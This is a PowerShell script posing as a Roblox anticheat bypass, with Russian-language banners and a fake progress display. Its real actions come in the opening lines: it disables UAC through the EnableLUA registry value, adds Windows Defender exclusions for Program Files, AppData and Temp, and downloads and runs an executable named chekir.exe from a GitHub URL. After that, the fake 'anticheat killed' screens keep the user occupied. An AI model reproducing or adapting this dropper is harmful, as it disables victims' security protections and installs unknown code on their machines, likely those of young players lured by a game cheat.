# ╔══════════════════════════════════════════════════════════╗
# ║                   ROBLOX OBHODKA v9.666                 ║
# ║          100% ЯДЕРНО-ЗЕЛЁНЫЙ ОБХОД • 30 сек запуск      ║
# ╚══════════════════════════════════════════════════════════╝

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0 -Force -ErrorAction SilentlyContinue

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles   = [Environment]::GetFolderPath("ProgramFiles")
        $ProgramFilesX86= [Environment]::GetFolderPath("ProgramFilesX86")
        $AppData        = [Environment]::GetFolderPath("ApplicationData")
        $LocalAppData   = [Environment]::GetFolderPath("LocalApplicationData")
        $Temp           = [System.IO.Path]::GetTempPath()

        Add-MpPreference -ExclusionPath $ProgramFiles    -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $ProgramFilesX86 -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $AppData        -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $LocalAppData    -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $Temp            -ErrorAction SilentlyContinue
    }
} catch {}
Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe
# ╔══════════════════ ВИЗУАЛ ══════════════════╗
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "Green"
Clear-Host

Write-Host @"
   __   _  __  _     _     
  |  _ \ / _ \| __ )| |   / _ \|  \/  |
  | |_) | | | |  _ \| |  | | | | |\/| |
  |  _ <| |_| | |_) | |__| |_| | |  | |
  |_| \_\\_/|/|_\_/|_|  |_|
        ██████ OBHODKA ██████
"@ -ForegroundColor Green

Write-Host "       Запуск ядерного обхода Roblox..." -ForegroundColor DarkGreen
Start-Sleep -Seconds 2

$steps = 30
for($i = 1; $i -le $steps; $i++) {
    $percent = [math]::Round(($i / $steps) * 100)

    if($i -in 8,16,24,30) {
        $msg = switch($i) {
            8  {"BYPASS DETECTED"}
            16 {"HYPER INJECT OK"}
            24 {"ANTICHEAT OFF"}
            30 {"FULL UNLOCKED"}
        }
        Write-Host "  █████████████████ $msg █████████████████" -ForegroundColor Green
    }

    Write-Progress -Activity "ROBLOX OBHODKA CONNECT" -Status "$percent% Завершено" -PercentComplete $percent
    Start-Sleep -Milliseconds 950
}

Clear-Host
$Host.UI.RawUI.ForegroundColor = "Green"

Write-Host @"
════════════════════════════════════════════════════════════
░▒▓█ ROBLOX OBHODKA УСПЕШНО АКТИВИРОВАНА █▓▒░
════════════════════════════════════════════════════════════
  Статус:     ████████████████████ 100% 
  Античит:    УБИТ НАВСЕГДА
  FPS:        UNLOCKED (9999+)
  Ping:       1 ms → Moon Server
  Привилегии: GOD MODE + ALL EXPLOITS
════════════════════════════════════════════════════════════
"@ -ForegroundColor Green

Write-Host "  Нажмите любую клавишу, чтобы закрыть..." -ForegroundColor DarkGreen
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
